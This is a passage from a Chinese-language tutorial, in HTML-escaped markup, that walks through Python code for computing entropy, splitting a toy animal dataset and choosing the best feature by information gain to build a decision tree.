&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    class_counter &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; vector &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; dataset:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        cls &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; vector[&lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        class_counter[cls] &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; class_counter&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;get(cls, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    entropy &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;0.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; class_counter&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;keys():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        prob &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;float&lt;/span&gt;(class_counter[key])&lt;span style=&#34;color:#ff6ac1&#34;&gt;/&lt;/span&gt;count
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        entropy &lt;span style=&#34;color:#ff6ac1&#34;&gt;-=&lt;/span&gt; prob &lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt; log(prob)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; entropy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dataset, features &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; create_dataset()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;entropy &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; calc_entropy(dataset)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Entropy: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;format(entropy))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;Entropy: 1.3208883431493221
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3怎么构建决策树&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3%e6%80%8e%e4%b9%88%e6%9e%84%e5%bb%ba%e5%86%b3%e7%ad%96%e6%a0%91&#34;&gt;
        #
    &lt;/a&gt;
    3.怎么构建决策树
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;核心问题：如何通过划分数据集计算信息量的提升来找到最有效的数据特征&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;练习2：重新划分数据集，将符合指定特征值的数据提取出来组合新的数据集合&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;split_dataset&lt;/span&gt;(dataset, feature, value):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    new_dataset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; data &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; dataset:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; data[feature] &lt;span style=&#34;color:#ff6ac1&#34;&gt;==&lt;/span&gt; value:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            new_data &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; data[:feature]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            new_data&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;extend(data[feature&lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;:])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            new_dataset&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;append(new_data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; new_dataset
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;小实验1：以下将有脚蹼和没有脚蹼的数据集划分出来&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feature &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; features&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;index(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;flippers&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;with_flipper_dataset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; split_dataset(dataset, feature, &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Dataset with flippers:&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(with_flipper_dataset)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Dataset without flippers:&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;with_flipper_dataset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; split_dataset(dataset, feature, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(with_flipper_dataset)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;Dataset with flippers:
[[2, &#39;Flat&#39;, &#39;No&#39;, &#39;duck&#39;]]
Dataset without flippers:
[[4, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [4, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [4, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [4, &#39;No&#39;, &#39;Yes&#39;, &#39;dog&#39;], [4, &#39;No&#39;, &#39;Yes&#39;, &#39;dog&#39;], [2, &#39;Sharp&#39;, &#39;No&#39;, &#39;chicken&#39;], [2, &#39;Sharp&#39;, &#39;No&#39;, &#39;chicken&#39;]]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;思考6：怎么表示最好的特征？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;信息增益：通过观察信息熵的变化求得&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;select_best_feature&lt;/span&gt;(dataset, features):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    feature_count &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(dataset[&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;])&lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    current_entropy &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; calc_entropy(dataset)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    feature_selected &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    best_entropy_gain &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dataset_size &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(dataset)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sub_datasets &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sub_features &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;range&lt;/span&gt;(feature_count):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        feature_values &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;set&lt;/span&gt;([vector[i] &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; vector &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; dataset])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        subset_entropy &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;0.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;  Calculating entropy by splitting dataset with feature[&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{0}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;]&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;format(features[i]))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        subsets &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; value &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; feature_values:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;    Splitting dataset with feature[&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{0}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;]==&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{1}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;format(features[i], value))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            subset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; split_dataset(dataset, i, value)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            subsets[value] &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; subset
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            prob &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(subset)&lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1.0&lt;/span&gt;)&lt;span style=&#34;color:#ff6ac1&#34;&gt;/&lt;/span&gt;dataset_size
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            subset_entropy &lt;span style=&#34;color:#ff6ac1&#34;&gt;+=&lt;/span&gt; prob &lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt; calc_entropy(subset)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;      Subset:&amp;#39;&lt;/span&gt;, subset)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;      Entropy:&amp;#39;&lt;/span&gt;, subset_entropy)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        entropy_gain &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; current_entropy&lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt;subset_entropy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;    Entropy gain: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;format(entropy_gain))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; best_entropy_gain &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;&lt;/span&gt; entropy_gain:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            best_entropy_gain &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; entropy_gain
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            feature_selected &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sub_datasets &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; subsets
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sub_features &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; features[:feature_selected]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sub_features&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;extend(features[feature_selected&lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;:])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; feature_selected, sub_datasets, sub_features
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;小实验2：请在数据全集上运行计算出最优数据特征&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;best_feature, sub_datasets, sub_features &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; select_best_feature(dataset, features)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Best feature: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;, name: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;format(best_feature, features[best_feature]))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; feature_value &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; sub_datasets&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;keys():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Sub dataset with feature[&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;]==&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;format(features[best_feature], feature_value))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(sub_datasets[feature_value])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Sub features: &amp;#39;&lt;/span&gt;, sub_features)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;  Calculating entropy by splitting dataset with feature[legs]
    Splitting dataset with feature[legs]==2
      Subset: [[0, &#39;Sharp&#39;, &#39;No&#39;, &#39;chicken&#39;], [0, &#39;Sharp&#39;, &#39;No&#39;, &#39;chicken&#39;], [1, &#39;Flat&#39;, &#39;No&#39;, &#39;duck&#39;]]
      Entropy: 0.2386928131105548
    Splitting dataset with feature[legs]==4
      Subset: [[0, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [0, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [0, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [0, &#39;No&#39;, &#39;Yes&#39;, &#39;dog&#39;], [0, &#39;No&#39;, &#39;Yes&#39;, &#39;dog&#39;]]
      Entropy: 0.6593251049913401
    Entropy gain: 0.661563238157982
  Calculating entropy by splitting dataset with feature[flippers]
    Splitting dataset with feature[flippers]==0
      Subset: [[4, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [4, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [4, &#39;No&#39;, &#39;No&#39;, &#39;cat&#39;], [4, &#39;No&#39;, &#39;Yes&#39;, &#39;dog&#39;], [4, &#39;No&#39;, &#39;Yes&#39;, &#39;dog&#39;], [2, &#39;Sharp&#39;, &#39;No&#39;, &#39;chicken&#39;], [2, &#39;Sharp&#39;, &#39;No&#39;, &#39;chicken&#39;]]
      Entropy: 0.9441181818928854
    Splitting dataset with feature[flippers]==1
      Subset: [[2, &#39;Flat&#39;, &#39;No&#39;, &#39;duck&#39;]]
      Entropy: 0.9441181818928854
    Entropy gain: 0.3767701612564367
  Calculating entropy by splitting dataset with feature[beak]
    Splitting dataset with feature[beak]==No
      Subset: [[4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;Yes&#39;, &#39;dog&#39;], [4, 0, &#39;Yes&#39;, &#39;dog&#39;]]
      Entropy: 0.4206322918807853
    Splitting dataset with feature[beak]==Flat
      Subset: [[2, 1, &#39;No&#39;, &#39;duck&#39;]]
      Entropy: 0.4206322918807853
    Splitting dataset with feature[beak]==Sharp
      Subset: [[2, 0, &#39;No&#39;, &#39;chicken&#39;], [2, 0, &#39;No&#39;, &#39;chicken&#39;]]
      Entropy: 0.4206322918807853
    Entropy gain: 0.9002560512685368
  Calculating entropy by splitting dataset with feature[swim]
    Splitting dataset with feature[swim]==No
      Subset: [[4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;No&#39;, &#39;cat&#39;], [2, 0, &#39;Sharp&#39;, &#39;chicken&#39;], [2, 0, &#39;Sharp&#39;, &#39;chicken&#39;], [2, 1, &#39;Flat&#39;, &#39;duck&#39;]]
      Entropy: 0.7585531985305136
    Splitting dataset with feature[swim]==Yes
      Subset: [[4, 0, &#39;No&#39;, &#39;dog&#39;], [4, 0, &#39;No&#39;, &#39;dog&#39;]]
      Entropy: 0.7585531985305136
    Entropy gain: 0.5623351446188085
Best feature: 2, name: beak
Sub dataset with feature[beak]==No
[[4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;No&#39;, &#39;cat&#39;], [4, 0, &#39;Yes&#39;, &#39;dog&#39;], [4, 0, &#39;Yes&#39;, &#39;dog&#39;]]
Sub features:  [&#39;legs&#39;, &#39;flippers&#39;, &#39;swim&#39;]
Sub dataset with feature[beak]==Flat
[[2, 1, &#39;No&#39;, &#39;duck&#39;]]
Sub features:  [&#39;legs&#39;, &#39;flippers&#39;, &#39;swim&#39;]
Sub dataset with feature[beak]==Sharp
[[2, 0, &#39;No&#39;, &#39;chicken&#39;], [2, 0, &#39;No&#39;, &#39;chicken&#39;]]
Sub features:  [&#39;legs&#39;, &#39;flippers&#39;, &#39;swim&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;思考7：如果改动数据集会出现什么情况？&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;决策树算法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%86%b3%e7%ad%96%e6%a0%91%e7%ae%97%e6%b3%95&#34;&gt;
        #
    &lt;/a&gt;
    决策树算法
&lt;/div&gt;
&lt;/h2&gt;
&lt;h4 id=&#34;算法描述&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ae%97%e6%b3%95%e6%8f%8f%e8%bf%b0&#34;&gt;
        ###
    &lt;/a&gt;
    算法描述：
&lt;/div&gt;
&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;当前数据集是否是确定的某个类型的数据，如果是则不用再对该数据集进行分类&lt;/li&gt;
&lt;li&gt;在当前数据集上选择最好的特征，通过使用这个特征区分的子数据集拥有最好的信息&lt;/li&gt;
&lt;li&gt;对各子数据集重复进行上述计算&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;伪代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bc%aa%e4%bb%a3%e7%a0%81&#34;&gt;
        ###
    &lt;/a&gt;
    伪代码：
&lt;/div&gt;
&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Function CreateTree
    IF 数据集不用再分割 THEN return 该数据集类别
    ELSE
        寻找待分类数据的最好特征
        划分子数据集
        创建分支节点
        for 每个划分的子数据集
            branchPoint = CreateTree
        return 分支节点
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;大家动手实现上面的算法，输出一棵树&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;4其他思考&#34; &gt;
&lt;div&gt;
